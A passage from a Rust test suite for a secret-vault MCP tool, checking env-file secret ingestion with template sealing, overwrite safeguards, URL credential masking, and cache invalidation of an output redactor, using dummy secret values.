         spring.datasource.password=dotted-secret-66\n",
    )
    .unwrap();

    // Refuses overwriting the source file with its sealed template.
    let self_overwrite = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: src_env.to_string_lossy().into_owned(),
            name: "Mixed Env".into(),
            item: String::new(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: false,
            seal_template_path: Some(src_env.to_string_lossy().into_owned()),
            overwrite_template: true,
        }))
        .await;
    assert_eq!(self_overwrite.is_error, Some(true));

    let res = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: src_env.to_string_lossy().into_owned(),
            name: "Mixed Env".into(),
            item: String::new(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: false,
            seal_template_path: Some(tpl_env.to_string_lossy().into_owned()),
            overwrite_template: false,
        }))
        .await;
    assert_eq!(res.is_error, Some(false), "{res:?}");
    let out = structured_value(&res);
    let out_text = out.to_string();
    for secret in [
        "super-secret-pass-42",
        "sk_live_primary_999",
        "tok_secondary_888",
        "lower-db-secret-77",
        "dotted-secret-66",
    ] {
        assert!(!out_text.contains(secret), "leaked {secret}: {out_text}");
    }
    assert!(out["templateRemovedLines"].is_null(), "{out}");
    assert!(out["templateRemovedKeys"].is_null(), "{out}");
    let keys: Vec<String> = out["ingestedKeys"]
        .as_array()
        .unwrap()
        .iter()
        .map(|v| v.as_str().unwrap().to_owned())
        .collect();
    assert!(keys.contains(&"username".to_owned()), "{keys:?}");
    assert!(keys.contains(&"password".to_owned()), "{keys:?}");
    assert!(keys.contains(&"apiCredential".to_owned()), "{keys:?}");
    assert!(keys.contains(&"TOKEN_secret".to_owned()), "{keys:?}");
    assert!(keys.contains(&"db_password".to_owned()), "{keys:?}");
    assert!(keys.contains(&"spring.datasource.password".to_owned()), "{keys:?}");

    let tpl = std::fs::read_to_string(&tpl_env).unwrap();
    assert!(tpl.contains("USERNAME={{openkeylet:username}}"), "{tpl}");
    assert!(tpl.contains("PASSWORD={{openkeylet:password}}"), "{tpl}");
    assert!(tpl.contains("API_KEY={{openkeylet:apiCredential}}"), "{tpl}");
    assert!(tpl.contains("TOKEN={{openkeylet:TOKEN_secret}}"), "{tpl}");
    assert!(tpl.contains("db_password={{openkeylet:db_password}}"), "{tpl}");
    assert!(
        tpl.contains("spring.datasource.password={{openkeylet:spring.datasource.password}}"),
        "{tpl}"
    );

    let item_id = Uuid::parse_str(out["itemId"].as_str().unwrap()).unwrap();
    let stored = vault.get_connection(item_id).unwrap();
    assert_eq!(stored.secrets.get("password"), Some("super-secret-pass-42"));
    assert_eq!(stored.secrets.get("apiCredential"), Some("sk_live_primary_999"));
    assert_eq!(stored.secrets.get("TOKEN_secret"), Some("tok_secondary_888"));
    assert_eq!(stored.secrets.get("db_password"), Some("lower-db-secret-77"));
    assert_eq!(
        stored.secrets.get("spring.datasource.password"),
        Some("dotted-secret-66")
    );

    // Re-ingesting onto the same item refuses without overwrite=true, and updates with overwrite=true.
    std::fs::write(&src_env, "PASSWORD=rotated-pass-99\nTOKEN=tok_rotated_77\n").unwrap();
    let blocked = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: src_env.to_string_lossy().into_owned(),
            name: String::new(),
            item: "Mixed Env".into(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: false,
            seal_template_path: None,
            overwrite_template: false,
        }))
        .await;
    assert_eq!(blocked.is_error, Some(true));

    let updated = mcp
        .secret_ingest_file(Parameters(SecretIngestFileInput {
            path: src_env.to_string_lossy().into_owned(),
            name: String::new(),
            item: "Mixed Env".into(),
            format: "auto".into(),
            folder: String::new(),
            description: String::new(),
            overwrite: true,
            seal_template_path: None,
            overwrite_template: false,
        }))
        .await;
    assert_eq!(updated.is_error, Some(false), "{updated:?}");
    let after = vault.get_connection(item_id).unwrap();
    assert_eq!(after.secrets.get("password"), Some("rotated-pass-99"));
    assert_eq!(after.secrets.get("apiCredential"), Some("tok_rotated_77"));
}

#[test]
fn mask_browser_url_strips_userinfo_and_masks_query_and_fragment() {
    assert_eq!(
        mask_browser_url("https://alice:pw@example.com/cb?code=secret123&state=xyz&code=dup#access_token=abc"),
        "https://example.com/cb?code=…&state=…#…"
    );
    assert_eq!(
        mask_browser_url("https://example.com/dashboard"),
        "https://example.com/dashboard"
    );
    assert_eq!(mask_browser_url(""), "");
    assert_eq!(mask_browser_url("not a url"), "");
}

#[test]
fn output_redactor_cache_hits_and_invalidates_on_vault_or_session_change() {
    let dir = tempdir().unwrap();
    let vault = Vault::open(dir.path().join("vault")).unwrap();
    let mcp = VaultMcp::new(vault.clone());

    let first = mcp.output_redactor();
    let second = mcp.output_redactor();
    assert!(Arc::ptr_eq(&first, &second), "unchanged vault must hit cache");

    // In-process vault write immediately invalidates even within the same millisecond.
    let mut secrets = SecretBundle::default();
    secrets.password = Some("cache-invalidate-secret-1".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: "login".into(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Cached Item".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: Vec::new(),
            test_path: String::new(),
            remove_secret_names: Vec::new(),
            secrets,
        })
        .unwrap();
    let third = mcp.output_redactor();
    assert!(!Arc::ptr_eq(&second, &third));
    assert_eq!(
        third.redact_string("leaked cache-invalidate-secret-1 here".into()),
        "leaked [REDACTED] here"
    );

    // Session-remembered secret also invalidates cache immediately.
    mcp.remember_secret("ephemeral-session-token-99");
    let fourth = mcp.output_redactor();
    assert!(!Arc::ptr_eq(&third, &fourth));
    assert_eq!(
        fourth.redact_string("out=ephemeral-session-token-99".into()),
        "out=[REDACTED]"
    );
}
